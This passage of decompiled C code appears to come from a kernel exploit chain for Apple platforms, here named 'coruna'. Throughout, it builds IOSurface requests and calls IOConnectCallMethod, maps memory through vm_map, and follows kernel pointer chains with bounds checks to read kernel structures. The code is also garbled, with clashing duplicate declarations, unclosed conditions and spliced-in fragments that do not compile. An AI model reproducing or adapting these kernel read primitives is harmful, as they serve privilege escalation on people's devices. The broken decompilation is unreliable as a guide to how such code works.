  long handle;
  long scratch;
  int bootargs;
  long thread_attr;
  
  thread_attr = 0;
  bootargs = 0;
  scratch = 0;
  u = *(uint64_t *)(handle + 8);
  handle = *(long *)(handle + 0x218);
  do {
    err = coruna_kernel600c_residual_228(u,handle + (unsigned long)*(uint *)(handle + 0x298),&thread_attr);
    if (err == 0) {
      return 0x3f002;
    }
    if (thread_attr == 0) {
      return 0;
    }
    err = coruna_kernel600c_via_kernel600c_via_fd_read_full(*(uint64_t *)(handle + 8),thread_attr + (unsigned long)*(uint *)(handle + 0x264),
                         &bootargs);
    if (err == 0) {
      return 0x3f002;
    }
    if (bootargs == 0) {
      err = coruna_kernel600c_residual_228(*(uint64_t *)(handle + 8),thread_attr + (unsigned long)*(uint *)(handle + 0x298)
                           ,&scratch);
      if (err == 0) {
        return 0x3f002;
      }
      if (thread_attr == scratch) {
        *(long *)(handle + 0x278) = thread_attr;
        err = coruna_kernel600c_residual_228(*(uint64_t *)(handle + 8),
                             thread_attr + (unsigned long)*(uint *)(handle + 0x294),&scratch);
        if (err == 0) {
          return 0x3f002;
        }
        if (scratch == 0) {
          return 0x3f002;
        }
        if (*(int *)(*(long *)(handle + 8) + 0x140) < 0x2258) {
          *(long *)(handle + 0x280) = scratch;
          return 0;
        }
        err = coruna_kernel600c_residual_228(*(long *)(handle + 8),scratch + 8,(long *)(handle + 0x280));
        if (err == 0) {
          return 0x3f002;
        }
        if (*(long *)(handle + 0x280) == 0) {
          return 0x3f002;
        }
        return 0;
      }
    }
    u = *(uint64_t *)(handle + 8);
    handle = thread_attr;
  } while( true );
}





uint64_t coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(long handle,uint64_t val,uint64_t *id_2,unsigned long arg)
{
  int err;
  uint64_t u;
  uint64_t size;
  long scratch;
  
  scratch = 0;
  *id_2 = 0;
  if (*(char *)(handle + 0x304) == '\0') {
    u = coruna_kernel600c_via_vm_map_e0c0(handle + 0x10,val,&scratch);
    if ((int)u != 0) {
      return u;
    }
    if (scratch == 0) {
      return 0x3f005;
    }
    *id_2 = 0;
    u = coruna_kernel600c_via_ioservicegetmatchingservice_4(handle + 0xf0,scratch,0,id_2);
    err = (int)u;
  }
  else {
    u = coruna_kernel600c_via_thread_get_state(handle,val,id_2,arg);
    err = (int)u;
  }
  if ((err == 0) && ((arg & 1) == 0)) {
    size = coruna_kernel600c_via_ctx_test_flag_8(*(uint64_t *)(handle + 8),*id_2);
    u = 0;
    *id_2 = size;
  }
  return u;
}





unsigned long coruna_kernel600c_via_thread_get_state(long arg,uint64_t val,uint64_t *n,unsigned long m)

{
  uint type_id_21;
  int n;
  uint64_t u;
  unsigned long size;
  long scratch;
  
  scratch = 0;
  n = _pthread_mutex_lock((pthread_mutex_t *)(arg + 0x638));
  size = 0xad020;
  if (n == 0) {
    size = coruna_thread_get_state(arg,val,n,8,&scratch);
    _pthread_mutex_unlock((pthread_mutex_t *)(arg + 0x638));
    if ((int)size == 0) {
      type_id_21 = 0xad022;
      if (scratch == 8) {
        type_id_21 = 0;
      }
      size = (unsigned long)type_id_21;
      if ((scratch == 8) && ((m & 1) == 0)) {
        u = coruna_kernel600c_via_ctx_test_flag_8(*(uint64_t *)(arg + 8),*n);
        size = 0;
        *n = u;
      }
    }
  }
  return size;
}





uint8_t * coruna_dlopen_iosurface_c104(long handle,uint64_t val,uint *size)
{
  int err;
  long handle;
  long *ptr;
  long addr;
  uint64_t u;
  uint64_t size;
  uint8_t *ptr;
  uint64_t version;
  long off;
  uint64_t *buf;
  long base;
  long ctx_val;
  uint64_t scratch;
  uint64_t bootargs;
  uint8_t thread_attr[24];
  uint host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0xf60;
  handle = _dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface",1);
  if (handle == 0) {
    ptr = (uint8_t *)0x1b001;
    if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return ptr;
    }
    ___stack_chk_fail();
  }
  ptr = (uint8_t *)0xad011;
  ptr = (long *)_dlsym(handle,"kIOSurfaceIsGlobal");
  if ((((ptr != (long *)0x0) && (off = *ptr, off != 0)) &&
      (ptr = (long *)_dlsym(handle,"kIOSurfaceWidth"), ptr != (long *)0x0)) &&
     (((base = *ptr, base != 0 &&
       (ptr = (long *)_dlsym(handle,"kIOSurfaceHeight"), ptr != (long *)0x0)) &&
      (ctx_val = *ptr, ctx_val != 0)))) {
    addr = _CFDictionaryCreateMutable
                      (0,0,k_kernel_kcftypedictionarykeycallbacks_slot,
                       k_kernel_kcftypedictionaryvaluecallbacks_slot);
    ptr = (uint8_t *)0xad009;
    if (addr != 0) {
      _CFDictionarySetValue(addr,off,*(uint64_t *)k_kernel_kcfbooleanfalse_slot);
      coruna_cfdictionarysetvalue_1aae0(addr,base);
      coruna_cfdictionarysetvalue_1aae0(addr,ctx_val);
      off = _IOCFSerialize(addr,1);
      if (off != 0) {
        err = *(int *)(handle + 0x140);
        if (err < 0x2258) {
          if (0x1f52 < err) goto done;
          if (err < 0x1c1b) {
            buf = (uint64_t *)0x0;
            version = 0;
            scratch = 0xdd0;
          }
          else {
            buf = (uint64_t *)0x0;
            version = 0;
          }
        }
        else {
          scratch = 0xa68;
done:
          bootargs = 0;
          version = 1;
          buf = &bootargs;
        }
        u = _CFDataGetBytePtr(off);
        size = _CFDataGetLength(off);
        err = _IOConnectCallMethod(val,0,buf,version,u,size,0,0,thread_attr,&scratch)
        ;
        if (err == 0) {
          if (host_info >> 0x10 == 0) {
            ptr = (uint8_t *)0x0;
            *size = host_info;
          }
          else {
            ptr = (uint8_t *)0x28011;
          }
        }
        else {
          ptr = &k_kernel_slot_1001;
        }
        _CFRelease(off);
      }
      _CFRelease(addr);
    }
  }
  _dlclose(handle);
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return ptr;
  }
  ___stack_chk_fail();
}





uint64_t coruna_memmem(long handle,unsigned long arg,unsigned long *arg)
{
  unsigned long *ptr;
  uint *buf;
  size_t ls3;
  unsigned long u;
  uint size;
  bool err;
  size_t ls7;
  int err;
  uint version;
  int status;
  void *ptr;
  void *buf;
  uint64_t port;
  long handle;
  long addr;
  unsigned long tag;
  long off;
  uint64_t kind;
  unsigned long type_id;
  size_t ls20;
  unsigned long scratch;
  long bootargs;
  long thread_attr;
  unsigned long host_info;
  unsigned long serial_buf;
  unsigned long action;
  uint32_t block_ctx;
  long stack_guard;
  
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  kind = 0xad022;
  scratch = 0;
  *arg = 0;
  if (*(char *)(handle + 0x304) != '\0') {
    if (*(long *)(handle + 0x280) == 0) {
      host_info = 0;
      serial_buf = 0;
      tag = *(unsigned long *)(handle + 0x218);
      if (tag == 0) {
        port = 0xad001;
        if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
        return port;
        }
        ___stack_chk_fail();
      }
      if ((*(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8)) <= tag) &&
         (tag < *(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)))) {
        port = coruna_kernel600c_via_thread_get_state(handle,tag + *(uint *)(handle + 0x298),&serial_buf,0);
        if ((int)port == 0) {
          ptr = (unsigned long *)(handle + 0x280);
          do {
            {
              if (*(long *)(handle + 0x308) == 0) {
              version = coruna_return_zero_2ba94(*(uint64_t *)(handle + 8));
              if (version != 0) {
              port = coruna_kernel600c_via_thread_get_state(handle,*(long *)(handle + 0x280) + (unsigned long)version,handle + 0x308,0)
              ;
              if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
              return port;
              }
              ___stack_chk_fail();
              }
              }
              else {
              check_ok:
              tag = *(unsigned long *)(handle + 0x310);
              if (tag == 0) {
              version = coruna_slab_meta_offset(*(uint64_t *)(handle + 8));
              if (version != 0) {
              port = coruna_kernel600c_via_thread_get_state(handle,*(long *)(handle + 0x308) + (unsigned long)version,handle + 0x310,
              0);
              if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
              return port;
              }
              ___stack_chk_fail();
              }
              }
              else {
              skip:
              if (((*(long *)(handle + 0x318) == 0) &&
              (port = coruna_kernel600c_via_thread_get_state(handle,tag,handle + 0x318,0), (int)port != 0)) ||
              ((*(long *)(handle + 800) == 0 &&
              (port = coruna_kernel600c_via_thread_get_state(handle,*(long *)(handle + 0x310) + 8,handle + 800,1),
              if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
              return port;
              }
              ___stack_chk_fail();
              }
              }
            }
            if ((serial_buf < *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8))) ||
               port = 0xad022;
               if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
               return port;
               }
               ___stack_chk_fail();
          } while ((int)port == 0);
        }
        if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
        return port;
        }
        ___stack_chk_fail();
      }
    }
    else {
done:
      if (*(long *)(handle + 0x308) == 0) {
        version = coruna_return_zero_2ba94(*(uint64_t *)(handle + 8));
        if (version != 0) {
          port = coruna_kernel600c_via_thread_get_state(handle,*(long *)(handle + 0x280) + (unsigned long)version,handle + 0x308,0)
          ;
          if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
          return port;
          }
          ___stack_chk_fail();
        }
      }
      else {
check_ok:
        tag = *(unsigned long *)(handle + 0x310);
        if (tag == 0) {
          version = coruna_slab_meta_offset(*(uint64_t *)(handle + 8));
          if (version != 0) {
            port = coruna_kernel600c_via_thread_get_state(handle,*(long *)(handle + 0x308) + (unsigned long)version,handle + 0x310,
                                  0);
            if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
            return port;
            }
            ___stack_chk_fail();
          }
        }
        else {
skip:
          if (((*(long *)(handle + 0x318) == 0) &&
              (port = coruna_kernel600c_via_thread_get_state(handle,tag,handle + 0x318,0), (int)port != 0)) ||
             ((*(long *)(handle + 800) == 0 &&
              (port = coruna_kernel600c_via_thread_get_state(handle,*(long *)(handle + 0x310) + 8,handle + 800,1),
              if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
              return port;
              }
              ___stack_chk_fail();
        }
      }
    }
  }
cleanup:
  port = 0xad022;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
    return port;
  }
  ___stack_chk_fail();
}





void coruna_cfdictionarysetvalue_1aae0(uint64_t val,uint64_t id_2)
{
  uint64_t u;
  uint32_t scratch;
  
  scratch = 0x20;
  u = _CFNumberCreate(0,9,&scratch);
  _CFDictionarySetValue(val,id_2,u);
  _CFRelease(u);
  return;
}





long coruna_kernel600c_via_ctx_test_flag_3(long handle,unsigned long arg)
{
  int err;
  unsigned long u;
  uint size;
  unsigned long version;
  long handle;
  long addr;
  
  if (*(long *)(handle + 0x328) == 0) {
    addr = 0;
  }
  else {
    if (*(int *)(handle + 0x630) != 0) {
      u = 0;
      size = 2;
      do {
        addr = handle + 0x330;
        version = *(unsigned long *)(addr + (unsigned long)(size - 2) * 8);
        handle = *(long *)(addr + (unsigned long)(size - 1) * 8);
        addr = *(long *)(addr + (unsigned long)size * 8);
        err = coruna_ctx_test_flag(*(uint64_t *)(handle + 8),0x20);
        if (err != 0) {
          addr = addr << 0xe;
        }
        if ((arg >= version && arg <= addr + version) &&
            (arg < version || addr + version != arg)) {
          return (arg - version) + handle;
        }
        u = u + 1;
        size = size + 3;
      } while (u < *(uint *)(handle + 0x630));
    }
    addr = (*(long *)(handle + 0x318) + arg) - *(long *)(handle + 800);
  }
  return addr;
}





void coruna_kernel600c_via_kernel600c_via_thread_get_state(uint64_t val,uint64_t id_2,uint32_t *size)
{
  uint64_t scratch;
  
  scratch = 0;
  coruna_kernel600c_via_thread_get_state(val,id_2,&scratch,1);
  *size = (int)scratch;
  return;
}





void coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(long handle,uint64_t val,uint64_t id_2,uint64_t *size_3)
{
  int err;
  uint64_t scratch;
  
  *size_3 = 0;
  err = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4_3();
  if (err != 0) {
    return;
  }
  coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,scratch + (unsigned long)*(uint *)(handle + 0x25c),size_3,0);
  return;
}





uint64_t coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4_2(long handle,long addr_2,unsigned long arg,unsigned long *arg)
{
  uint64_t u;
  long handle;
  unsigned long scratch;
  unsigned long bootargs;
  unsigned long thread_attr;
  
  u = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,(unsigned long)*(uint *)(handle + 600) + addr_2,&thread_attr,0);
  if ((int)u != 0) {
    return u;
  }
  handle = *(long *)(handle + 8);
  if ((*(unsigned long *)(&k_kernel_slot_19e8 + handle) <= thread_attr) &&
     (thread_attr < *(unsigned long *)(&k_kernel_slot_19f0 + handle))) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
      u = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,thread_attr,&bootargs,0);
      if ((int)u != 0) {
        return u;
      }
      if (bootargs < *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8))) {
        return 0x3f002;
      }
      if (*(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)) <= bootargs) {
        return 0x3f002;
      }
    }
    else {
      bootargs = thread_attr;
    }
    u = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,bootargs + (arg & 0xffffffff) * 8,&scratch,0);
    if ((int)u != 0) {
      return u;
    }
    if (*(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8)) <= scratch) {
      if (scratch < *(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8))) {
        *arg = scratch;
        return 0;
      }
      return 0x3f002;
    }
  }
  return 0x3f002;
}





uint64_t coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4_3(long handle,uint64_t val,uint64_t id_2,unsigned long *arg)
{
  uint64_t u;
  long scratch;
  unsigned long bootargs;
  
  u = coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4_2();
  if (((int)u == 0) &&
     (u = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,scratch + (unsigned long)*(uint *)(handle + 0x268),&bootargs,0),
     (int)u == 0)) {
    u = 0x3f002;
    if ((*(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8)) <= bootargs) &&
       (bootargs < *(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)))) {
      u = 0;
      *arg = bootargs;
    }
  }
  return u;
}





void coruna_pthread_mach_thread_np(long handle)
{
  uint32_t u;
  int err;
  kern_return_t lk3;
  mach_port_t target_act;
  vm_address_t *ptr;
  uint32_t scratch;
  uint32_t bootargs;
  
  if (*(unsigned long *)(handle + 0x158) < 0x27120000000000) {
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      return;
    }
    scratch = 0xffffffff;
    err = coruna_open_dev_null(&scratch);
    if (err != 0) {
      return;
    }
    if (*(int *)(&k_kernel_slot_1944 + handle) != -1) {
      _close(*(int *)(&k_kernel_slot_1944 + handle));
      *(uint32_t *)(&k_kernel_slot_1944 + handle) = 0xffffffff;
    }
    *(uint64_t *)(&UNK_00001950 + handle) = 0;
    *(uint64_t *)(&k_kernel_slot_1948 + handle) = 0;
    *(uint64_t *)(&k_kernel_slot_1958 + handle) = 0;
    u = scratch;
  }
  else {
    bootargs = 0xffffffff;
    err = coruna_open_dev_null(&bootargs);
    if (err != 0) {
      return;
    }
    ptr = *(vm_address_t **)(&k_kernel_slot_1d50 + handle);
    *(uint64_t *)(&k_kernel_slot_1d50 + handle) = 0;
    u = bootargs;
    if (ptr != (vm_address_t *)0x0) {
      if ((((*ptr == 0) || (ptr[1] == 0)) ||
          (lk3 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*ptr,ptr[1]),
          lk3 == 0)) && ((pthread_t)ptr[2] != (pthread_t)0x0)) {
        target_act = _pthread_mach_thread_np((pthread_t)ptr[2]);
        lk3 = _thread_resume(target_act);
        if (lk3 == 0) {
          _pthread_join((pthread_t)ptr[2],(void **)0x0);
        }
      }
      ptr[1] = 0;
      *ptr = 0;
      ptr[3] = 0;
      ptr[2] = 0;
      *(uint64_t *)(&k_kernel_slot_1d50 + handle) = 0;
      _free(ptr);
      u = bootargs;
    }
  }
  coruna_close(u);
  return;
}





uint64_t coruna_kernel600c_via_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4_4(long handle,unsigned long arg,int flags)
{
  unsigned long u;
  uint64_t size;
  int err;
  unsigned long scratch;
  uint64_t bootargs;
  
  err = 0;
  scratch = arg;
joined_r0x0000d430:
  do {
    u = arg;
    if (scratch == 0) {
      while (size = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,u + 8,&scratch,0), (int)size == 0) {
        {
          err = err + 1;
          scratch = arg;
          if (err == 3) {
          return 0xad011;
          }
        }
        if (scratch < *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8))) {
          return 0xad022;
        }
        if (*(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)) <= scratch) {
          return 0xad022;
        }
        bootargs = 0;
        size = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,scratch + *(uint *)(handle + 0x264),&bootargs,1);
        if ((int)size != 0) break;
        u = scratch;
        *(unsigned long *)(handle + 0x218) = scratch;
        return 0;
      }
    }
    else {
      if ((scratch < *(unsigned long *)(&k_kernel_slot_19e8 + *(long *)(handle + 8))) ||
         (*(unsigned long *)(&k_kernel_slot_19f0 + *(long *)(handle + 8)) <= scratch)) {
        return 0xad022;
      }
      bootargs = 0;
      size = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,scratch + *(uint *)(handle + 0x264),&bootargs,1);
      if ((int)size == 0) {
        if ((int)bootargs == flags) {
done:
          *(unsigned long *)(handle + 0x218) = scratch;
          return 0;
        }
        size = coruna_kernel600c_via_kernel600c_via_ioservicegetmatchingservice_4(handle,scratch,&scratch,0);
        if ((int)size == 0) goto joined_r0x0000d430;
      }
    }
    if ((int)size != 0xad011) {
      return size;
    }
fail:
    err = err + 1;
    scratch = arg;
    if (err == 3) {
      return 0xad011;
    }
  } while( true );
}





uint64_t coruna_return_zero_d558(long handle)
{
  bool err;
  int err;
  int *err;
  uint u;
  
  ___error();
  *(uint8_t *)(handle + 0x29) = 1;
  u = 0;
fail:
  do {
    err = ___ulock_wait(0x10001,(uint32_t *)(handle + 0x1c),0,*(uint32_t *)(handle + 0x1c));
    if (err == 0) {
      *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 1;
    }
    else {
      if (((err == -1) && (err = ___error(), *err == 4)) &&
         (err = u < 100, u = u + 1, err)) goto fail;
      err = ___error();
      if (*err != 0xe) {
        return 0;
      }
    }
    u = 0;
    if (*(char *)(handle + 0x28) != '\0') {
      return 0;
    }
  } while( true );
}





unsigned long coruna_thread_switch(long arg,uint64_t val,int n)

{
  long handle;
  int n;
  uint u;
  uint size;
  unsigned long version;
  long serial_16;
  uint64_t port;
  long serial_17;
  long serial_10;
  uint *block;
  uint tag;
  uint kind;
  long addr;
  uint32_t cache_51;
  int cache_76;
  long cache_75;
  long cache_28;
  long cache_77;
  
  cache_51 = 0xffffffff;
  version = coruna_open_dev_null(&cache_51);
  if ((int)version != 0) {
    return version;
  }
  n = _pthread_mutex_lock((pthread_mutex_t *)(arg + 0x6d0));
  if (n != 0) {
    coruna_close(cache_51);
    return 0xad020;
  }
  block = *(uint **)(arg + 8);
  size = *block & 0x518e241;
  u = 0x2802c;
  kind = 0x2802c;
  if (size < 0x4000) {
    tag = 0x538;
    if (size < 0x200) {
      if (size == 1) {
        tag = 0x508;
      }
      _pthread_mutex_unlock((pthread_mutex_t *)(arg + 0x6d0));
      size = coruna_close(cache_51);
      if (u != 0) {
      size = u;
      }
      return (unsigned long)size;
    }
    else if (size == 0x200) {
      tag = 0x4f8;
    }
    else {
      u = kind;
      _pthread_mutex_unlock((pthread_mutex_t *)(arg + 0x6d0));
      size = coruna_close(cache_51);
      if (u != 0) {
      size = u;
      }
      return (unsigned long)size;
    }
  }
  else if (size < 0x100000) {
    if (size == 0x4000) {
      tag = 0x518;
    }
    else {
      u = kind;
      _pthread_mutex_unlock((pthread_mutex_t *)(arg + 0x6d0));
      size = coruna_close(cache_51);
      if (u != 0) {
      size = u;
      }
      return (unsigned long)size;
    }
  }
  else {
    _pthread_mutex_unlock((pthread_mutex_t *)(arg + 0x6d0));
    size = coruna_close(cache_51);
    if (u != 0) {
    size = u;
    }
    return (unsigned long)size;
  }
  n = coruna_ctx_test_flag(block,0x5584201);
  serial_10 = 0xd8;
  if (n != 0) {
    serial_10 = 0x90;
  }
  if ((0x225b < *(int *)(*(long *)(arg + 8) + 0x140)) &&
     (((n = coruna_ctx_test_flag(*(long *)(arg + 8),0x80000), n != 0 ||
       (n = coruna_ctx_test_flag(*(uint64_t *)(arg + 8),0x100000), n != 0)) ||
      (n = coruna_ctx_test_flag(*(uint64_t *)(arg + 8),0x1000000), n != 0)))) {
    tag = tag - 8;
  }
  if (0x2711 < *(int *)(*(long *)(arg + 8) + 0x140)) {
    n = coruna_ctx_test_flag(*(long *)(arg + 8),0x1100000);
    if (n == 0) {
      tag = tag - 0x10;
    }
    else {
      tag = tag - 8;
    }
  }
  addr = *(long *)(block + 0x752);
  u = 0xad001;
  if ((addr != 0) && (serial_17 = *(long *)(addr + 8), u = 0xad001, serial_17 != 0)) {
    handle = arg + 0xf0;
    n = 0xb;
    do {
      if (n != 0xb) {
        _thread_switch(*(mach_port_name_t *)(addr + 0x18),2,10);
      }
      cache_77 = 0;
      u = coruna_kernel600c_via_ioservicegetmatchingservice_4(handle,serial_17 + (unsigned long)tag,0,&cache_77);
      _pthread_mutex_unlock((pthread_mutex_t *)(arg + 0x6d0));
      size = coruna_close(cache_51);
      if (u != 0) {
      size = u;
      }
      return (unsigned long)size;
    } while (n != 0);
    u = 0x28026;
  }
  _pthread_mutex_unlock((pthread_mutex_t *)(arg + 0x6d0));
  size = coruna_close(cache_51);
  if (u != 0) {
  size = u;
  }
  return (unsigned long)size;
}





uint64_t coruna_kernel600c_via_vm_map_e0c0(long handle,unsigned long arg,long *addr_2)
{
  uint64_t u;
  long handle;
  unsigned long size;
  
  *addr_2 = 0;
  if (arg + 0x1000000000000 < 0xfffffffff000) {
    handle = *(long *)(handle + 0xd0);
    if ((handle == 0) || (*(long *)(handle + 0xd8) == 0)) {
      u = coruna_vm_map_e0c0(handle);
      if ((int)u != 0) {
        return u;
      }
      handle = *(long *)(handle + 0xd0);
    }
    if (*(unsigned long *)(handle + 200) != 0) {
      size = 0;
      do {
        if ((*(int *)(handle + (unsigned long)((int)size + 0x20)) != 0) &&
           (*(unsigned long *)(handle + (unsigned long)((int)size + 0x18)) ==
            (arg & (*(unsigned long *)k_kernel_vm_page_mask_slot ^ 0xffffffffffffffff)))) {
          handle = *(long *)k_kernel_vm_page_size_slot;
          *addr_2 = (*(unsigned long *)k_kernel_vm_page_mask_slot & arg) +
                     ((((*(long *)(handle + 0xb8) + handle) - 1U & -handle) >>
                      ((unsigned long)*(uint *)k_kernel_vm_page_shift_slot & 0x3f)) + size / 0x30) * handle;
          return 0;
        }
        size = size + 0x30;
      } while ((size & 0xffffffff) < *(unsigned long *)(handle + 200));
    }
    u = 0;
  }
  else {
    u = 0xad001;
  }
  return u;
}





uint coruna_vm_map_e0c0(long handle)
{
  uint u;
  int err;
  unsigned long size;
  vm_inherit_t in_stack_ffffffffffffffd0;
  vm_address_t scratch;
  
  scratch = 0;
  if ((*(long *)(handle + 0xd0) == 0) || (*(long *)(handle + 0xd8) == 0)) {
    err = (int)((unsigned long)(*(long *)(handle + 0xb8) - *(long *)(handle + 0xb0)) / 0x30);
    *(int *)(handle + 0xc0) = err;
    size = (unsigned long)(uint)(err * 0x30);
    *(unsigned long *)(handle + 200) = size;
    u = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,0,1,
                    *(mem_entry_name_port_t *)(*(long *)(handle + 0x10) + 0x98),
                    (*(long *)(handle + 0xb0) - *(long *)(*(long *)(handle + 0x10) + 8)) +
                    *(long *)k_kernel_vm_page_size_slot * -2,0,1,1,in_stack_ffffffffffffffd0);
    if (u == 0) {
      *(vm_address_t *)(handle + 0xd0) = scratch;
      *(unsigned long *)(handle + 0xd8) = size;
      u = 0;
    }
    else {
      u = u | 0x80000000;
    }
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_shmem_scan_regions(uint64_t *val)
{
  unsigned long u;
  unsigned long size;
  uint64_t version;
  uint64_t port;
  long handle;
  long addr;
  long off;
  long base;
  unsigned long tag;
  long ctx_val;
  long serial;
  long serial_7;
  uint kind;
  int scratch;
  uint bootargs;
  uint8_t thread_attr[12];
  int host_info;
  uint serial_buf;
  uint action;
  uint8_t block_ctx[8];
  uint32_t stack_guard;
  uint32_t scratch;
  int sa_saved;
  long sa_new;
  long path_buf;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  handle = val[7];
  version = (*(void (*)*val)(val[2],handle,0x20,thread_attr);
  if ((((int)version == 0) && (port = 0xad014, version = port, serial_buf - 9 < 0x37 && host_info == 2))
     && ((unsigned long)action <= (unsigned long)(*(long *)k_kernel_vm_kernel_page_size_slot * 2))) {
    kind = 0;
    ctx_val = 0;
    addr = 0;
    tag = 0;
    handle = handle + 0x20;
    u = handle + (unsigned long)action;
    off = 0;
    serial = 0;
    do {
      version = port;
      if (((u < handle + 8U) ||
          (version = (*(void (*)*val)(val[2],handle,8,&scratch), (int)version != 0)) ||
         if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
         ___stack_chk_fail();
         }
         return version;
    } while (kind < serial_buf);
    val[9] = addr;
    val[10] = serial_7;
    val[0xb] = ctx_val;
    val[0xc] = base;
    val[0xd] = tag - addr;
    version = 0;
    if (*(long *)(&k_kernel_slot_19c8 + val[3]) == 0 && addr != 0) {
      *(long *)(&k_kernel_slot_19c8 + val[3]) = addr;
    }
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail();
  }
  return version;
}





uint64_t coruna_return_zero_ddbc(long handle,unsigned long arg,unsigned long arg)
{
  void (*ptr)(void);
  uint64_t u;
  uint size;
  uint8_t *ptr;
  uint version;
  uint port;
  uint tag;
  uint kind;
  int err;
  uint64_t type_id;
  long handle;
  unsigned long type_id_8;
  uint scratch;
  char bootargs;
  int thread_attr;
  
  scratch = 0;
  handle = *(long *)(handle + 0x18);
  err = coruna_ctx_test_flag(handle,0x400000);
  if (((err == 0) && (*(long *)(handle + 0x80) == 0)) &&
     (err = coruna_ctx_test_flag(handle,0x5584241), err != 0)) {
    ptr = *(void (**)(handle + 8);
    u = *(uint64_t *)(handle + 0x10);
    err = coruna_ctx_test_flag(*(uint64_t *)(handle + 0x18),0x5584001);
    type_id = 0x2000007e4;
    if (err != 0) {
      type_id = 0x200000680;
    }
    type_id = (*ptr)(u,type_id,&scratch,0);
    ptr = k_kernel_vm_page_size_slot;
    if ((int)type_id != 0) {
      return type_id;
    }
    *(unsigned long *)(handle + 0x38) =
         *(long *)(*(long *)(handle + 0x20) + 8) +
         *(long *)k_kernel_vm_page_size_slot * (unsigned long)scratch;
    ptr = *(void (**)(handle + 8);
    u = *(uint64_t *)(handle + 0x10);
    err = coruna_ctx_test_flag(*(uint64_t *)(handle + 0x18),0x5584001);
    type_id = 0x2000007e8;
    if (err != 0) {
      type_id = 0x200000684;
    }
    type_id = (*ptr)(u,type_id,&scratch,0);
    if ((int)type_id != 0) {
      return type_id;
    }
    *(unsigned long *)(handle + 0x80) =
         *(long *)(*(long *)(handle + 0x20) + 8) + *(long *)ptr * (unsigned long)scratch;
  }
  if ((arg & 1) == 0) {
    err = coruna_ctx_test_flag(handle,0x400000);
    if ((err == 0) && (err = coruna_ctx_test_flag(handle,0x5584201), err != 0)) {
      return 0;
    }
    err = coruna_ctx_test_flag(handle,0xa000);
    if (err != 0) {
      err = coruna_ctx_test_flag(handle,0x8000);
      type_id = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),0x20ae00008,&scratch,0);
      version = scratch;
      if (err == 0) {
        if ((int)type_id != 0) {
          return type_id;
        }
        type_id = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),0x20ae00010,&scratch,0)
        ;
        size = scratch;
        if ((int)type_id != 0) {
          return type_id;
        }
        type_id = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),0x20ae00028,&scratch,0)
        ;
        port = scratch;
        if ((int)type_id != 0) {
          return type_id;
        }
        type_id = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),0x20ae00030,&scratch,0)
        ;
        if ((int)type_id != 0) {
          return type_id;
        }
        handle = coruna_u64_pack((scratch), (port));
      }
      else {
        if ((int)type_id != 0) {
          return type_id;
        }
        type_id = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),0x20ae0000c,&scratch,0)
        ;
        size = scratch;
        if ((int)type_id != 0) {
          return type_id;
        }
        type_id = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),0x20ae00010,&scratch,0)
        ;
        port = scratch;
        if ((int)type_id != 0) {
          return type_id;
        }
        type_id = (**(void (**)(handle + 8))(*(uint64_t *)(handle + 0x10),0x20ae00014,&scratch,0)
        ;
